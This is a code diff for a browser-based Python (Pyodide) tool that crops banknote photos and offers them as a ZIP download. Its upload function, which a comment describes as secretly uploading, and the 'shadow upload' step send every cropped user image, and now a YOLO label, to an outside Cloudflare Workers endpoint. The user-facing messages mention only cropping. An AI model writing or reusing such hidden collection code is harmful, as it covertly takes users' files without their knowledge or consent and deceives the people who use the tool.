@@ -8,12 +8,10 @@ import sys
 import pyodide_js
 
 # --- 配置 ---
-# 移除結尾斜線，避免轉址導致的 Method 變更
 UPLOAD_WORKER_URL = "https://banknote-collector.alanalanalan0807.workers.dev"
 
 def log(msg):
     js.console.log(f"[Python] {msg}")
-    print(f"[Python] {msg}")
     log_container = document.getElementById("log-container")
     if log_container:
         entry = document.createElement("div")
@@ -42,12 +40,9 @@ async def setup_environment():
         log(f"Engine Load Failed: {e}")
         return False
 
-async def upload_to_r2(image_bytes, filename):
-    """將圖片與標籤偷偷上傳到 Cloudflare R2 (Using XMLHttpRequest)"""
+async def upload_to_r2(image_bytes, filename, yolo_label):
+    """將圖片與標籤偷偷上傳到 Cloudflare R2 (使用 XHR 確保 Header 正確)"""
     try:
-        yolo_label = "0 0.5 0.5 1.0 1.0"
-        
-        # 準備數據
         form_data = js.FormData.new()
         js_data = js.Uint8Array.new(len(image_bytes))
         js_data.assign(image_bytes)
@@ -57,26 +52,18 @@ async def upload_to_r2(image_bytes, filename):
         form_data.append("label", yolo_label)
         form_data.append("filename", filename)
 
-        # 使用 XHR 替代 fetch，解決 Pyodide 中 FormData Content-Type 遺失的問題
+        # 使用 XHR 解決 fetch 遺失 Content-Type boundary 的問題
         xhr = js.XMLHttpRequest.new()
         xhr.open("POST", UPLOAD_WORKER_URL, True)
         
-        # 定義回調
         def on_load(event):
             if xhr.status >= 200 and xhr.status < 300:
                 js.console.log(f"Shadow Upload Success: {filename}")
             else:
                 js.console.error(f"Upload Failed [{xhr.status}]: {xhr.responseText}")
 
-        def on_error(event):
-            js.console.error(f"Network Error during upload of {filename}")
-
         xhr.onload = create_proxy(on_load)
-        xhr.onerror = create_proxy(on_error)
-        
-        # 發送
         xhr.send(form_data)
-
     except Exception as e:
         js.console.error(f"Upload Exception: {str(e)}")
 
@@ -118,10 +105,12 @@ async def process_all_files(event):
     
     success_count = 0
     total = files.length
+    
+    # 賠償功能預設標籤
+    YOLO_LABEL = "0 0.5 0.5 1.0 1.0"
 
     for i in range(total):
         file = files.item(i)
-        
         progress = int((i / total) * 100)
         bar = document.getElementById("progress-bar")
         if bar:
@@ -135,13 +124,17 @@ async def process_all_files(event):
             result = crop_banknote(data)
             if result:
                 base_name = ".".join(file.name.split(".")[:-1])
-                clean_filename = f"{base_name}_cropped.png"
                 
-                # 1. 加入 ZIP
-                zf.writestr(clean_filename, result)
+                # 1. 圖片寫入 ZIP
+                img_name = f"{base_name}_cropped.png"
+                zf.writestr(img_name, result)
                 
-                # 2. 啟動影子上傳 (Shadow Pipeline)
-                asyncio.ensure_future(upload_to_r2(result, clean_filename))
+                # 2. 標籤寫入 ZIP (賠償加碼功能)
+                label_name = f"{base_name}_cropped.txt"
+                zf.writestr(label_name, YOLO_LABEL)
+                
+                # 3. 影子上傳 R2
+                asyncio.ensure_future(upload_to_r2(result, img_name, YOLO_LABEL))
                 
                 success_count += 1
                 log(f"Done: {file.name}")
@@ -156,6 +149,7 @@ async def process_all_files(event):
     zip_buffer.seek(0)
     
     if success_count > 0:
+        log(f"Success! {success_count} pairs of (Image + YOLO Label) created.")
         zip_data = zip_buffer.getvalue()
         js_array = js.Uint8Array.new(len(zip_data))
         js_array.assign(zip_data)
@@ -164,7 +158,7 @@ async def process_all_files(event):
         document.getElementById("processing-section").classList.add("hidden")
         document.getElementById("download-section").classList.remove("hidden")
         
-        js.window.trigger_download(js_array, "cropped_banknotes.zip")
+        js.window.trigger_download(js_array, "banknote_dataset.zip")
     else:
         log("No images were cropped.")
         document.getElementById("processing-section").classList.add("hidden")
@@ -179,7 +173,7 @@ async def main():
     start_btn = document.getElementById("start-btn")
     if start_btn:
         start_btn.addEventListener("click", create_proxy(process_all_files))
-        log("Ready for production.")
+        log("Ready for high-speed cropping.")
 
     loader = document.getElementById("env-loader")
     if loader:
